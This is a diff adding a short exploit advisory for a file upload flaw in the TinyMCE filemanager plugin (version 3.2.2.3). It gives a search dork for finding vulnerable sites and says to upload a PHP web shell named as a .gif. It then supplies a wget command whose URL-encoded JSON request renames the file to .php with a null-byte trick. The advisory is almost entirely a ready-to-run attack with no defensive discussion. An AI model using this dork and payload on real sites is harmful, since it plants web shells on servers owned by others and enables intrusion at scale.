@@ -1,0 +1,32 @@
+==============================================
+File Upload Vulnerability [ Plugins tiny_mce ]
+==============================================
+
+http://tinymce.moxiecode.com/plugins_filemanager.php
+Major version 3
+Minor version 2.2.3
+
+####################################################################
+
+       Author             : Vladimir Vorontsov
+       Contact            : d0znpp [at] gmail [dot] com
+
+       Greetz       : GNU
+       My Group         : ONSEC Russian Security Team
+
+####################################################################
+
+[~] DORK: inurl:/tiny_mce/plugins/filemanager/
+
+--------------------------------------------------------------------
+
+[~] You go to      :
+http://web.com/tiny_mce/plugins/filemanager/pages/fm/index.html
+[~] Upload shell   : use PHP content and .gif extension, in example a.gif
+[~] Move it 2 .php :
+ $ wget
+--post-data="json_data=%7B%22method%22%3A%22fm.moveFiles%22%2C%22params%22%3A%5B%7B%22frompath0%22%3A%22%7B0%7D%2Fimages%2F
+*a.gif*%22%2C%22toname0%22%3A%22*a.php%00.gif*%22%7D%5D%2C%22id%22%3A%22c0%22%7D"
+ http://web.com/tiny_mce/plugins/filemanager/rpc/index.php
+
+####################################################################
